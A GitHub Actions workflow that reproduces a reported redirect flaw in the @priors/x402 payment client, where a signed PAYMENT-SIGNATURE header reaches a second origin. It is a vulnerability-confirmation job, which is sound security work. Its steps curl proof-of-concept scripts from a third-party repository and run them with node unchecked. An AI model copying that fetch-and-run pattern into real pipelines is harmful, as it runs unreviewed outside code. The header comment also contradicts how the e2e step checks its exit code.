name: Priors PoC - x402 redirect guard

# Independent CI confirmation of a finding in priors-agents/priors (@priors/x402).
# This bot has no push access to that fork, so the PoC runs against a fresh checkout of
# the exact upstream commit that contains the defect, unmodified.
#
# Two checks:
#   1. unit  - the Request handed to fetch is built with redirect:"follow" instead of
#              "manual" when init.redirect is undefined.
#   2. e2e   - two real HTTP servers: the merchant 302s to a second origin, and the
#              second origin reports whether it received the signed PAYMENT-SIGNATURE
#              header. This demonstrates the leak rather than inferring it.
#
# Both checks expect the finding, so both exit NON-ZERO when it reproduces. The job
# asserts that, so it passes only when the bug is present.

on:
  push:
    branches: [master]
  workflow_dispatch:

jobs:
  redirect-guard:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Check out priors at the reported commit
        run: |
          git clone --depth 1 https://github.com/priors-agents/priors.git priors
          cd priors
          git fetch --depth 1 origin 32e0e8dfadfc7c5fcb8d99c2d30e061d7d8a84ea
          git checkout FETCH_HEAD
          echo "priors at: $(git rev-parse HEAD)"

      - name: Install dependencies
        working-directory: priors
        run: npm install --no-audit --no-fund

      - name: Unit PoC - the redirect mode of the request the payer builds
        working-directory: priors
        run: |
          curl -fsSL -o scripts/test-x402-redirect-guard.mjs https://raw.githubusercontent.com/xShadowxIQ/contracts/678e3fd1beaf5028b79cca36f03b50d6ba330cb2/.github/poc/x402-redirect-guard.mjs
          set +e
          node scripts/test-x402-redirect-guard.mjs | tee poc.out
          rc=${PIPESTATUS[0]}
          set -e
          echo "unit PoC exit code: $rc"
          if [ "$rc" -eq 0 ]; then
            echo "::error::the redirect guard held; the reported finding does not reproduce"
            exit 1
          fi
          grep -qE 'redirect ?= ?"follow"' poc.out || { echo "::error::unexpected failure"; exit 1; }
          echo "::notice::CONFIRMED: resend() drops redirect:manual to follow when init.redirect is undefined"

      - name: End-to-end PoC - the signed header reaches a second origin
        working-directory: priors
        run: |
          curl -fsSL -o scripts/test-x402-redirect-e2e.mjs https://raw.githubusercontent.com/xShadowxIQ/contracts/678e3fd1beaf5028b79cca36f03b50d6ba330cb2/.github/poc/x402-redirect-e2e.mjs
          set +e
          node scripts/test-x402-redirect-e2e.mjs | tee poc-e2e.out
          rc=${PIPESTATUS[0]}
          set -e
          echo "e2e exit code: $rc"
          if [ "$rc" -ne 0 ]; then
            echo "::error::the redirect was NOT followed; the finding does not reproduce end to end"
            exit 1
          fi
          grep -q 'origin B received PAYMENT-SIGNATURE' poc-e2e.out || {
            echo "::error::e2e passed for an unexpected reason"; exit 1; }
          echo "::notice::CONFIRMED END TO END: the signed authorization arrived intact at the redirect target"

      - name: Publish
        if: always()
        run: cat priors/poc.out priors/poc-e2e.out >> "$GITHUB_STEP_SUMMARY"
